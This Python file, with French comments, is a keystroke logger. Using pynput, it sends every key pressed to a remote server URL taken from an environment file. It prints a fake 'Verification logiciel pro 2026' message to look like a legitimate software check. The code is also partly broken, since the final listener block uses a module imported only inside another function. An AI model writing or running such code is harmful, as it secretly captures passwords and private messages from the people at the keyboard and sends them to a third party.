
from httpcore import URL

import requests
import os 
from dotenv import load_dotenv
from pathlib import Path
USE_PYNPUT = os.environ.get("USE_PYNPUT") == "1"

ROOT_DIR = Path(__file__).parent

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_FILE = os.path.join(BASE_DIR, "/var/data/log.txt")

load_dotenv(ROOT_DIR / '.env')

# MongoDB connection
SERVER_URL = os.environ['SERVER_URL']


# Fichier local pour enregistrer mes codes
print("Verification logiciel pro 2026 ✅", flush=True)


requests.post(SERVER_URL, json={"content": "test"})

def start_keyboard_listener():
    from pynput import keyboard  # import ici uniquement

    listener = keyboard.Listener(on_press=on_press)
    listener.start()  # surtout 

# Fonction pour enregistrer les frappes dans un fichier
def on_press(key):

    payload = {"content": str(key)}
    try:
      requests.post(SERVER_URL, json={"content": str(key)}, timeout=5)

    except Exception as e:
        print(f"Erreur d'enregistrement: {e}")


# Démarre l'écoute des frappes
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
